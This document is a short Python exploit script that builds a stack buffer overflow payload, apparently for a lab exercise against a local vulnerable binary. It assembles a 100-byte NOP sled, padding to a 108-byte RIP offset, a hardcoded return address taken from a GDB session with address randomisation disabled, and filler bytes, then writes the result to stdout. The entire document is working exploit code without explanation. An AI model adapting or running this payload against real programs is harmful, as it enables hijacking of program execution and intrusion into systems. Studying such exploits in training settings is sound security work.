import sys
import struct

# Total offset to RIP is 108 bytes.
# We will make almost all of it a NOP sled.
nop_sled = b"\x90" * 100

# Padding to fill the rest of the 108 bytes.
padding = b"A" * (108 - len(nop_sled)) # 108 - 100 = 8 bytes

# The deterministic address we found in the `setarch` GDB session.
# We will aim directly at the start of our new, big NOP sled.
target_address = 0x7fffffffe3e0 

packed_address = struct.pack("<Q", target_address)

# Construct the payload.
payload = nop_sled + padding + packed_address
payload += b'C' * (500 - len(payload))

sys.stdout.write(payload)